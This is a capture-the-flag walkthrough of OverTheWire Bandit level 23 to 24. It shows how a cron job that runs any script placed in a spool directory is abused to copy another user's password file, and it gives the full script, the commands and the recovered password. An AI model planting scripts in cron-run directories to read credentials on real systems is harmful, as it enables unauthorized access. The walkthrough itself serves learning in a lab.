This is a very simple challenge, which makes us feel a bit tough!
![Bandit23](https://github.com/sreekesari-vangeepuram/overthewire/blob/master/overthewire/bandit/bandit23/level23-%3Elevel24.png)

If you are familiar with bash-scripting it's just a piece-of-cake for you!
Or else, learn bash-scripting from [Ryan's tutorials](https://ryanstutorials.net/bash-scripting-tutorial/). 
Also do you know what is a cron-job?

If you've surfed a bit around here-an-there in the previous leve, you might have come across this:
```
bandit22@bandit:~$ ls -al /var
total 48
drwxr-xr-x 11 root     root     4096 May  7 20:14 .
drwxr-xr-x 26 root     root     4096 May 13 12:50 ..
drwxr-xr-x  2 root     root     4096 Sep  3 06:52 backups
drwxr-xr-x  7 root     root     4096 May  3 14:25 cache
-rwx------  1 root     root        0 May  7 19:45 crash
-rw-------  1 bandit22 bandit22  348 May  7 20:14 .info22.txt
drwxr-xr-x 31 root     root     4096 May  7 19:45 lib
drwxrwsr-x  2 root     staff    4096 Jun  3  2018 local
lrwxrwxrwx  1 root     root        9 May  3 14:16 lock -> /run/lock
drwxr-x---  8 root     root     4096 Sep  3 06:52 log
drwxrwsr-x  2 root     mail     4096 May  3 14:16 mail
drwxr-xr-x  2 root     root     4096 May  3 14:16 opt
lrwxrwxrwx  1 root     root        4 May  3 14:16 run -> /run
drwxr-xr-x  5 root     root     4096 May 14 09:41 spool
drwx------  2 root     root     4096 May  7 19:45 tmp
bandit22@bandit:~$ cat /var/.info22.txt 
Did you know that cron was invented by Brian Kernighan, co-author of the C
programming language? There is much confusion about what "cron" means. Most
people assume it is derived from "Chronos", which is greek for "time". Of
course to be really sure, someone would have to ask Brian Kernighan, who is
currently a professor at Princeton University.
bandit22@bandit:~$
```
`Brian Kernighan` is one of the legendary computer scientists. He contributed alot for the development of Unix OS alongwith Ken Thompson and Dennis Ritchie.
If you wanna know more about him and his creations, I suggest you to watch this [video](https://www.youtube.com/watch?v=O9upVbGSBFo).

Let's see what we can do:
```
bandit23@bandit:~$ ls /etc/cron.d/
cronjob_bandit15_root  cronjob_bandit17_root  cronjob_bandit22  cronjob_bandit23  cronjob_bandit24  cronjob_bandit25_root
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mkdir /tmp/get_bandit24_pass
bandit23@bandit:/tmp/get_bandit24_pass$ ls
bandit23@bandit:/tmp/get_bandit24_pass$ nano bashing_script.sh
Unable to create directory /home/bandit23/.nano: Permission denied
It is required for saving/loading search history or cursor positions.

Press Enter to continue

bandit23@bandit:/tmp/get_bandit24_pass$ cat bashing_script.sh 
#!/bin/bash

# First let's create a file to store the password of user `bandit24`
touch /tmp/get_bandit24_pass/password_of_bandit24 && chmod +rw /tmp/get_bandit24_pass/password_of_bandit24

# Since the owner of the file `/etc/bandit_pass/bandit24` is bandit24 and so the owner of the directory of /var/spool/bandit24
cat /etc/bandit_pass/bandit24 >> /tmp/get_bandit24_pass/password_of_bandit24

# Finally, let's copy this script to `/var/spool/bandit24`
bandit23@bandit:/tmp/get_bandit24_pass$
bandit23@bandit:/tmp/get_bandit24_pass$ chmod +rwx bashing_script.sh 
bandit23@bandit:/tmp/get_bandit24_pass$ cp bashing_script.sh /var/spool/bandit24/
bandit23@bandit:/tmp/get_bandit24_pass$ chmod 777 .
bandit23@bandit:/tmp/get_bandit24_pass$ date
Thu Sep  3 13:00:46 CEST 2020
bandit23@bandit:/tmp/get_bandit24_pass$ date
Thu Sep  3 13:02:03 CEST 2020
bandit23@bandit:/tmp/get_bandit24_pass$ ls
bashing_script.sh  password_of_bandit24
bandit23@bandit:/tmp/get_bandit24_pass$ cat password_of_bandit24 
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
bandit23@bandit:/tmp/get_bandit24_pass$
```

Since the owner of the file `/etc/bandit_pass/bandit24` and the eligible group of the directory `/var/spool/bandit24/` is the user `banidt24`;
and also since there's a cron job running just as the example which is a hint for us at `/usr/bin/cronjob_bandit24.sh`...the process-flow might've striked your brain.
That with the time limit something like `timeout -s 9 60 ./<script>`, the script in the directory `/var/spool/banidt24` run every one-minute.
To be able to other  users to access the file `/tmp/get_bandit24_pass/password_of_bandit24` we gave permissions to both it's directory and the file-itself.

So finally we get the password directly from `/etc/bandit_pass/bandit24` to our file `/tmp/get_bandit24_pass/password_of_bandit24`, because of the cron-job, which runs our script which was copied into `/var/spool/bandit24/`.

Hope you've learnt something new from this [if you don't know this before/didn't strike to you during the start].

Now, let's use the password `UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ` to log into the remote-machine as `bandit24`.

**Warning: Please, first try Level 24 -> Level 25! Otherwise it's useless to simply cpy-pst the command[s]/password[s].
